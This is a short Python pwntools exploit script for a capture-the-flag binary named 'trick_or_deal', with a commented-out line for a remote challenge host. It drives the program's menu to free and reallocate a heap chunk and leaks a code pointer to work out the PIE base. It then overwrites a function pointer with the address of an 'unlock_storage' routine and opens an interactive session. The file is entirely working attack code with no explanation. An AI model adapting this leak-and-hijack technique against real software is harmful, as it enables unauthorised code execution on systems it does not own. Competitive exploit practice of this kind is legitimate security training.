from pwn import *
import time
prompt = b"? "
context.log_level='debug'
p = process("./trick_or_deal")
#p = remote("138.68.189.179" ,31676)

def offer(length,data):
    p.recvuntil(prompt)
    p.sendline(b"3")
    p.recvuntil(b": ")
    p.sendline(b"y")
    p.recvuntil(prompt)
    p.sendline(length)
    p.recvuntil(prompt)
    p.send(data)

def steal():
    p.recvuntil(prompt)
    p.sendline(b"4")

def view():
    p.recvuntil(prompt)
    p.sendline(b"1")

steal()
offer(str(0x50).encode('utf-8'), b"A"*0x48)

view()
p.recvuntil(b": \n")
p.recv(0x49)
leak = u64(p.recv(6)+b"\x00\x00")
print(hex(leak))
base = leak - 0xbe6
unlock_storage = base + 0xeff

steal()

offer(str(0x50).encode('utf-8'), b"A"*0x48 + p64(unlock_storage))

view()
p.interactive()
